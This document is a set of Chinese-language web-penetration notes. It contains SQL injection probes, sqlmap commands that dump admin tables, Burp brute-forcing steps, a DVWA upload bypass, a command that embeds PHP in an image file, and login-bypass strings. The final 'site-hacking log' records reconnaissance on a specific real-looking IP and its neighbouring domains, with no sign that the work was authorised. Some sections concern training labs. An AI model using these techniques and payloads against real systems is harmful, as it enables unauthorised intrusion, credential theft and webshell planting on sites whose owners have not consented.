# Web安全笔记

## SQL 注入

**本质**：把用户输入的数据当代码来执行，违背了“数据与代码分离”的原则。

**关键条件**：

	1.用户能控制输入的内容
	
	2.Web 应用执行的代码中，拼接了用户输入的内容

**攻击**：通过构建特殊的输入作为参数传入 Web 应用程序，而这些输入大都是 SQL 语法里的一些组合，通过执行 SQL 语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。

**寻找注入点**

只要在 id 后面输入任意的字符后，`网站页面报错`，则说明有注入。

因为只要网站报错，就说明我们任意输入的字符被带入到数据库查询了，因此我们可以插入恶意的 SQL 语句，注入攻击就这样产生了。

**猜解数据表**

找到注入点后，进行猜解

```sql
and exists(select * from user)  -- 表存在页面就会返回正常，否则报错
and exists(select * from amdin)
```

**猜解数据列**

```sql
and exists(select password from admin)  -- 存在就返回正常，否则页面报错  aclin
```

**猜解数据列长度**

```sql
and (select top 1 len(admin) from admin)>3  -- len() 返回文本字段中值的长度
-- 若 admin 表中 admin 列的长度大于3则返回正常
```

**猜解数据列内容**

```sql
and (select top 1 asc(mid(admin,1,1)) from admin)>96
-- 如果 admin 列中的第一个字符的 ASCII 码大于97则返回正常
SELECT MID(column_name,start[,length]) FROM table_name; -- 从文本字段中提取字符(起始值为1)
SELECT TOP number|percent column_name(s) FROM table_name;  -- 规定要返回的记录的条数
```

```shell
https://sqlwiki.netspi.com/detection#mysql  # 参考网站
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false

product.asp?id=1/1 -- true
product.asp?id=1/0 -- false
```

**sqlmap 使用**

```shell
# 检查注入点：
sqlmap -u http://aa.com/star_photo.php?artist_id＝11

# 爆当前数据库信息：
sqlmap -u http://aa.com/star_photo.php?artist_id＝11 --current-db

# 指定库名列出所有表
sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 --tables
('vhost48330' 为指定数据库名称)

# 指定库名表名列出所有字段
sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 -T admin --columns
('admin' 为指定表名称)

# 指定库名表名字段dump出指定字段
sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 -T admin -C ac，id，password --dump  ('ac,id,password' 为指定字段名称)
```



MySQL 中有 information_schema 表，可以使用联合查询来查询敏感表中的敏感数据，

> MySQL  ->  数据库名  ->  表名  ->  列名  ->  数据

Access 是以单文件，mdb 格式，以表的形式存在，所以数据库也就只有一个文件。

> Access  ->  表名  ->  列名  ->  数据

而 Access 只能靠暴力猜解的方式进行。

### Sqli-labs 搭建

```shell
git clone https://github.com/Audi-1/sqli-labs.git

修改 sql-connections/sql-labs/db-creds.inc MySQL用户名/密码
放到 Apache 下或者 PHPstudy这种集成工具

From your browser access the sql-labs folder to load index.html
Click on the link setup/resetDB to create database, create tables and populate Data.
Labs ready to be used, click on lesson number to open the lesson page.
Enjoy the labs
```



## XSS

## 代码审计

## 文件上传

## PHP 特性

## 后台登录类

## 加解密

## 

## 

## 

## 工具

### Burp Suite

+ Proxy

    拦截 HTTP /S 的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。

+ Spider

    应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。

+ Scanner[仅限专业版]

    一个高级的工具，执行后，它能自动地发现 web应用程序的安全漏洞。

+ Intruder

    高度可配置的工具，对 web 应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用 fuzzing 技术探测常规漏洞。

+ Repeater

    靠手动操作来补发单独的 HTTP请求，并分析应用程序响应的工具。

+ Sequencer

    用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。

+ Decoder

    进行手动执行或对应用程序数据者智能解码编码的工具。

+ Comparer

    通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。 

```shell
cupp -i  # 加入社工信息，生成特有字典
proxy -> history  # 找到登录信息
Send to intruder
clear§  # 清楚所有§
add§  # 在需要爆破的地方加§
payloads -> load... # 导入字典
options -> number of threads  # 设置多线程
start attack  # 观察状态码和长度
```

若 Burp 无法抓取 DVWA 等本地包，代理设置中删除 `不使用代理` ：<u>localhost,127.0.0.1</u> 即可

**全局参数设置和使用**

+ Project option

#### 实例



目录与文件扫描

##### 暴力破解后台

##### 暴力破解一句话木马

##### 配合 sqlmap 实现被动式注入发现

##### 突破文件上传

+ 分析 medium 级别代码

```php
<?php
if( isset( $_POST[ 'Upload' ] ) ) {
        // Where are we going to be writing to?
        $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
        $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

        // File information
        $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
        $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
        $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

        // Is it an image?
        if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
                ( $uploaded_size < 100000 ) ) {

                // Can we move the file to the upload folder?
                if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], 						$target_path ) ) {
                        // No
                        $html .= '<pre>Your image was not uploaded.</pre>';
                }
                else {
                        // Yes!
                        $html .= "<pre>{$target_path} succesfully uploaded!</pre>";
                }
        }
        else {
                // Invalid file
                $html .= '<pre>Your image was not uploaded. We can only accept JPEG 				or PNG images.</pre>';
        }
}
```

这里分别通过`$_FILES['uploaded']['type']`和`$_FILES['uploaded']['size']`获取了上传文件的 MIME类型和文件大小。

MIME类型用来设定某种扩展名文件的打开方式，当具有该扩展名的文件被访问时，浏览器会自动使用指定的应用程序来打开，如jpg图片的MIME为`image/jpeg`。

因而medium与low的主要区别就是对文件的MIME类型和文件大小进行了判断，这样就只允许上传jpg格式的图片文件。

`../`即为上级目录

+ **用 Burp 抓包改下 `Content-Type` 为 `image/jpeg`**，上传成功

+ 上传正常文件，拦截上传内容，将代码从请求头插进去

+ 文件包含

    ```shell
    copy xx.png/b+xxx.php/a xxx.png
    ```

##### 数据获取测试

### sqlmap

```shell
# 网站有防注入过滤，当提交and 1=1时，返回了非法操作的提示，再在网站后面添加其他字符，只要报错，就说明有注入
# Acess 中转注入攻击
sqlmap -u http://172.16.12.2/onews.asp --cookie "id=40" --level 3 --dbs --tables
# 表示使用cookie的方式提交， --level 表示测试的等级, --dbs表示将数据库显示出来，--tables是将表名显示出来。程序员没有考虑到恶意用户会通过cookie来提交参数，因此没有调用防注入程序来过滤cookie部分，从而导致cookie注入的发生
sqlmap -u http://172.16.12.2/onews.asp --cookie "id=40" --level 3 --dbs -T admin --columns  # 指定 admin 表
sqlmap -u http://172.16.12.2/onews.asp --cookie "id=40" --level 3 --dbs -T admin -C admin password --dump # 将数据内容脱到本地
```

## 思路

+   信息收集 (whois email 电话 站长密码 生日 mail密码 办公段 服务器端 该公司的人员架构…)
+   主站迟迟拿不下，绝大部分二级域名泛解析到和主站的同一个 IP
+   入手二级域名，挨个排查，二级域名的个数差不多能有40个
+   根据二级域名的名字选择 upload edit 等等这种具有操作功能的站点入手
+   edit网站存在svn泄露，但是是最原始wc.db的形式，利用 sqlite 把源码还原出来
+   进行代码审计，快速定位代码，全文搜索 exec, upload 等等危险操作
+   审计到一个 exec 命令执行，发现需要用管理员权限
+   回溯代码，定位管理员登陆功能，审计处 cookie 算法可破解
+   伪造 cookie 反弹 shell，上去以后发现很多站点都在上面，权限不够
+   查看一下版本 (2.6.18-194.11.3.el5)
+   利用之前 ctf 中的一个一句话提权成功，然后大杀四方

---

+   成功登陆后台 -> getshell
+   getshell 失败 -> 转换思路 -> 挖掘其他漏洞 (sqlinjection) -> 列库收集用户信息(外网撕出扣子网内网钻)
+   用户名密码 -> 撞邮箱 -> 在邮箱中搜索关键信息 -> 拿到VPN
+   通过 VPN 访问文件服务器 -> 写脚本 getshell

---

+   xss -> 打到后台 -> 403 -> ajax 抓取页面回转出来 -> sql 注入 -> getflag

+   Bypass Waf 注入 (%00,||,seselectlect等等) 国内CTF Web常见题型

+   代码审计 花式杂耍PHP各种特性(反序列化，弱类型等等)

+   文件上传 花式 Bypass 上传(.php111 .inc .phtml .phpt)

+   各种当前热点漏洞

    扫描路径 -> phpinfo -> php7 -> php7apachce -> 查看文档 -> 花式绕坑 -> getshell

+   社会工程学(常用密码等等)

+   各种Web漏洞夹杂

+   具有内网环境的真是渗透场景 

**信息收集：**

 + web服务器：Apache、Tomcat、IIS
 + 跑在什么系统上
 + 可以利用已知漏洞绕过题目直接拿flag

### SQL 注入

+   简单注入

    ‘’    and 1=1   or 1=2   ^ 1=1

+   宽字节注入

+   花式绕 MySQL

    结合PHP特性

+   绕关键词检测拦截

    大小写？

+   MongoDB 注入

    NoSQLmap

+   http 头注入

    X-Forward-注入

    refer注入

+   二次注入

    插入型，从另一个界面插入

---

**解题思路**

+   简单注入，手工或sqlmap跑

+   判断注入点，是否是http头注入？是否在图片处注入

+   判断注入类型

+   利用报错信息注入

+   尝试各种绕过过滤的方法

+   查找是否是通用某模板存在的注入漏洞

    ……

**Tricks**

```shell
sql-mode = "STRICT_TRANS_TABLES"(默认未开启)
```



## 日站记录

### 信息收集

+ IP：154.80.253.139
+ 可能域名：0539y.com
+ Server: Microsoft-IIS/10.0
+ X-Powered-By: ASP.NET

+ nmap 扫描

```shell
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
3306/tcp open  mysql
Device type: general purpose
Running: Linux 2.4.X, Microsoft Windows XP|7|2012
OS CPE: cpe:/o:linux:linux_kernel:2.4.37 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2012
OS details: DD-WRT v24-sp2 (Linux 2.4.37), Microsoft Windows XP SP3, Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012
```

+ Nikto 扫描

```shell
nikto -h http://example.com -output ~/nikto.html -Format htm
# 结果
http://154.80.253.139/phpMyAdmin/index.php
http://154.80.253.139:80/5cMlHAOg.aspx  # 暂时连不上
http://154.80.253.139/phpMyAdmin/doc/html/index.html  # 偶然发现
```

+ 最牛逼的信息收集网站

```shell
https://dnslytics.com/ip/154.80.253.139

# 旁站
bjshuxue.com	
pinkewang.com
# 数据库信息
[INFO] the back-end DBMS is Microsoft Access
web server operating system: Windows 10 or 2016
web application technology: ASP.NET, Microsoft IIS 10.0, ASP
back-end DBMS: Microsoft Access

i03.net	
tzsiss.com.cn	
cz-huatian.com	
nplxs.com	
wangmin.name	
4006080.com	
flyemail.cn	
zj5156.org

# 邮箱 2018-08-05
mail.jianuo2.xyz
mail.taiyangyy.top
```

+ 目录扫描

```shell
http://154.80.253.139/phpMyAdmin/db_create.php  # 与 index.php 同界面
```



+ 万能密码

```shell
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
```